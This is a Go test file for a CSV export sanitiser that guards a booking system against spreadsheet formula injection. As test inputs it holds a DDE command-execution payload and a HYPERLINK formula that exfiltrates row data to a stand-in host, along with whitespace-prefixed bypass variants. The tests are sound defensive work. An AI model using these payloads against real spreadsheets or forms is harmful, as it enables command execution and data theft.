package handler

import (
	"encoding/csv"
	"strings"
	"testing"
)

// In-package: csvSafe is unexported. It guards the CSV export, whose cells carry
// names, addresses and notes typed by whoever made the booking — text a stranger
// put into a public form, opened later in a spreadsheet that will evaluate it.

func TestCSVSafe(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		// The four characters Excel, LibreOffice and Sheets all treat as the start
		// of a formula.
		{name: "equals", in: "=1+1", want: "'=1+1"},
		{name: "plus", in: "+1+1", want: "'+1+1"},
		{name: "minus", in: "-1+1", want: "'-1+1"},
		{name: "at", in: "@SUM(A1:A9)", want: "'@SUM(A1:A9)"},

		// The case that actually reaches a spreadsheet: a name field used to run a
		// command. Phase 10 checked exactly this one by hand.
		{
			name: "a command in a name field",
			in:   `=cmd|' /C calc'!A0`,
			want: `'=cmd|' /C calc'!A0`,
		},
		{
			name: "a hyperlink that exfiltrates the row",
			in:   `=HYPERLINK("http://evil.example?x="&A1,"klik")`,
			want: `'=HYPERLINK("http://evil.example?x="&A1,"klik")`,
		},

		// Leading whitespace that a spreadsheet ignores would otherwise carry the
		// payload straight past a naive first-character check.
		{name: "tab before the formula", in: "\t=1+1", want: "'=1+1"},
		{name: "carriage return before it", in: "\r=1+1", want: "'=1+1"},
		{name: "newline before it", in: "\n=1+1", want: "'=1+1"},
		{name: "several", in: "\r\n\t=1+1", want: "'=1+1"},

		// Ordinary values are untouched — a mangled export is its own kind of bug.
		{name: "a name", in: "Budi Santoso", want: "Budi Santoso"},
		{name: "a booking code", in: "TPJ-20260727-A1B2", want: "TPJ-20260727-A1B2"},
		{name: "an amount", in: "150000.00", want: "150000.00"},
		{name: "a phone number", in: "081234567890", want: "081234567890"},
		{name: "an address with punctuation", in: "Jl. Contoh No. 1", want: "Jl. Contoh No. 1"},
		{name: "empty", in: "", want: ""},
		{name: "whitespace only", in: "\t\r\n", want: ""},
		// A leading space is not a bypass: a spreadsheet does not treat " =1+1" as
		// a formula, and prefixing it would corrupt a legitimate value.
		{name: "a leading space", in: " =1+1", want: " =1+1"},
		// The dangerous character has to be first.
		{name: "an equals in the middle", in: "a=1", want: "a=1"},
		{name: "a phone with a plus in the middle", in: "0812+3456", want: "0812+3456"},

		// This one is a real value the export carries: an international phone
		// number starts with a plus, so it gets prefixed. Displaying '+62... is a
		// small cost next to evaluating whatever else starts with one.
		{name: "an international phone number", in: "+6281234567890", want: "'+6281234567890"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := csvSafe(tc.in); got != tc.want {
				t.Errorf("csvSafe(%q) = %q, want %q", tc.in, got, tc.want)
			}
		})
	}
}

// TestCSVSafeOutputIsNeverAFormula states the property: whatever goes in, the
// first character of what comes out is not one a spreadsheet will evaluate.
func TestCSVSafeOutputIsNeverAFormula(t *testing.T) {
	inputs := []string{
		"=1", "+1", "-1", "@1",
		"\t=1", "\r+1", "\n-1", "\r\n@1",
		"\t\t\t=cmd|' /C calc'!A0",
		"=", "+", "-", "@",
	}

	for _, in := range inputs {
		got := csvSafe(in)
		if got == "" {
			continue
		}
		switch got[0] {
		case '=', '+', '-', '@':
			t.Errorf("csvSafe(%q) = %q, which a spreadsheet will still evaluate", in, got)
		}
	}
}

// TestCSVSafeSurvivesTheEncoder: encoding/csv quotes a field containing a comma
// or a quote, and the neutralised value has to come back out of a parse intact —
// otherwise the export is safe but unreadable.
func TestCSVSafeSurvivesTheEncoder(t *testing.T) {
	values := []string{
		`=cmd|' /C calc'!A0`,
		`Budi, Santoso`,
		`Dia bilang "halo"`,
		`+6281234567890`,
		"Catatan\ndengan baris kedua",
	}

	record := make([]string, len(values))
	for i, v := range values {
		record[i] = csvSafe(v)
	}

	var out strings.Builder
	w := csv.NewWriter(&out)
	if err := w.Write(record); err != nil {
		t.Fatalf("writing: %v", err)
	}
	w.Flush()
	if err := w.Error(); err != nil {
		t.Fatalf("flushing: %v", err)
	}

	back, err := csv.NewReader(strings.NewReader(out.String())).Read()
	if err != nil {
		t.Fatalf("reading back: %v", err)
	}
	if len(back) != len(record) {
		t.Fatalf("read back %d fields, wrote %d", len(back), len(record))
	}
	for i := range record {
		if back[i] != record[i] {
			t.Errorf("field %d round-tripped to %q, want %q", i, back[i], record[i])
		}
	}
}
